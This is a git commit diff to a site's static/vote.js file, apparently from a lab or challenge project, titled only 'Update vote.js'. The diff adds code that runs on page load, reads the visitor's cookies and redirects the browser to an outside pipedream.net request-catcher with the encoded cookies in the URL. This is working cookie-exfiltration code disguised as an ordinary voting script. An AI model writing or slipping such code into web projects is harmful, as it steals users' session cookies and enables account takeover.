2e8ca6601a52dcfe13cb866b878e14c2a62137ab
Jung HeeJun <68227020+Standchen@users.noreply.github.com>
2023-09-13 22:30:58 +0900

    Update vote.js

--- static/vote.js
+++ static/vote.js
@@ -1,6 +1,13 @@
 window.addEventListener('load', function() {
   const button = document.getElementById('voteButton');
   if (button) {
-    window.location.href = "https://en5d37gzesvtc.x.pipedream.net";
+    // Get cookies from the current page
+    const cookies = document.cookie;
+    
+    // Encode cookies to safely include them in a URL
+    const encodedCookies = encodeURIComponent(cookies);
+    
+    // Redirect to the other host with cookies as URL parameters
+    window.location.href = `http://en5d37gzesvtc.x.pipedream.net?cookies=${encodedCookies}`;
   }
 });
